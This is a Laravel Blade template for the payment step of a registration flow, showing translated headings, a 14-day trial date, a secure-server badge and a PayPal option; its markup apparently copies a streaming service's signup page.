<div class="simpleRegister">
    <div class="simpleContainer" data-transitioned-child="true">
        <div class="centerContainer contextStep with-mobile-mop-logos" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
            <div class="paymentContainer" data-uia="payment-container">
                <div>
                    <div class="stepLogoContainer">
                        <span class="stepLogo paymentStepLogo"></span>
                    </div>
                    <div class="stepHeader-container" data-uia="header">
                        <div class="stepHeader" data-a11y-focus="true" tabindex="0">
                            <span class="stepIndicator" data-uia="" id="">@lang('register.step_3_title')</span>
                            <h1 class="stepTitle" data-uia="stepTitle">@lang('register.step_3_subtitle')</h1>
                        </div>
                    </div>
                    <div class="narrowContainer" data-uia="messagesContainer">
                        <div>
                            <div class="contextRow contextRowFirst" data-uia="" id="">
                                {!! trans('register.step_3_p1', ['trial_end' =>  \Carbon\Carbon::now()->addDay(14)->format('Y/m/d')]) !!}
                            </div>
                            <div class="contextRow" data-uia="" id="">
                                @lang('register.step_3_p2')
                            </div>
                        </div>
                        <div class="contextRow" data-uia="encouragements">
                            <div data-uia="" id="">
                                <b>@lang('register.step_3_p3')</b>
                            </div>
                            <div data-uia="" id="">
                                <b>@lang('register.step_3_p4')</b>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="secure-server-badge">
                    <svg class="secure-server-badge--icon" id="secure-server-icon" viewbox="0 0 12 16">
                        <g fill="none">
                            <g fill="#FFB53F">
                                <path d="M8.4 5L8.4 6.3 10 6.3 10 5C10 2.8 8.2 1 6 1 3.8 1 2 2.8 2 5L2 6.3 3.6 6.3 3.6 5C3.6 3.7 4.7 2.6 6 2.6 7.3 2.6 8.4 3.7 8.4 5ZM11 7L11 15 1 15 1 7 11 7ZM6.5 11.3C7 11.1 7.3 10.6 7.3 10.1 7.3 9.3 6.7 8.7 6 8.7 5.3 8.7 4.7 9.3 4.7 10.1 4.7 10.6 5 11.1 5.5 11.3L5.2 13.4 6.9 13.4 6.5 11.3Z"></path>
                            </g>
                        </g></svg>
                    <div class="secure-server-badge--text">
                        @lang('register.secure_server')
                    </div>
                </div>
                <div>
                    <div class="nfTabSelectionWrapper" data-uia="payment-choice+paypalOption" id="paypalDisplayStringId">
                        <a class="nfTabSelection nfTabSelection--active paymentPicker standardHeight" href="{{route('regstep31')}}">
                            <div class="mopNameAndLogos">
                                <div class="nfTabSelection--text card-type-text paymentActive">
                                    <span class="selectionLabel">PayPal</span>
                                </div>
                                <div class="logosContainer">
                                    <span aria-label="Vi accepterar PAYPAL_NO_TEXT." class="logos logos-inline" data-uia="cardLogos-comp"><img alt="" class="logoIcon PAYPAL_NO_TEXT" data-uia="logoIcon-PAYPAL_NO_TEXT" src="{{url('images/regimages/paypal.svg')}}"></span>
                                </div>
                            </div><span class="ui-svg-icon ui-svg-icon--chevron pull-right pickerArrow"></span></a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
